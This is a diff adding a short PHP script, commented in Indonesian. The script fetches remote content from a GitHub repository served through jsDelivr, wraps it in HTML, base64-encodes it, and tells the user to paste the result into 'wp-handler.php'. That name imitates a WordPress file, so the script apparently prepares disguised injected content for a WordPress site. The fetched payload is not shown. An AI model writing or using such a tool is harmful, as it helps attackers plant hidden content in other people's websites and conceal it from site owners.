@@ -1,0 +1,30 @@
+<?php
+// URL Target
+$url = 'https://cdn.jsdelivr.net/gh/ereshagaming/Cdn-globaljs@main/cdn-globaljs/mainjs/upperjs/qq15.txt';
+
+// Menggunakan stream context agar tidak diblokir server (karena masalah User-Agent)
+$options = [
+    "http" => [
+        "header" => "User-Agent: PHP\r\n"
+    ]
+];
+$context = stream_context_create($options);
+
+// Mengambil konten
+$payload = @file_get_contents($url, false, $context);
+
+// Cek apakah data berhasil diambil
+if ($payload === false || empty($payload)) {
+    die("Gagal mengambil data dari GitHub! Pastikan URL benar atau allow_url_fopen aktif.");
+}
+
+// Membungkus payload ke dalam div
+$html = "<div>" . $payload . "</div>";
+
+// Encode Base64 (satu baris tanpa kompresi)
+$encoded = base64_encode($html);
+
+// Menampilkan hasil
+echo "<h3>SALIN KE wp-handler.php:</h3>";
+echo "<textarea style='width:100%; height:150px; font-family:monospace;' wrap='off' readonly>" . htmlspecialchars($encoded) . "</textarea>";
+?>
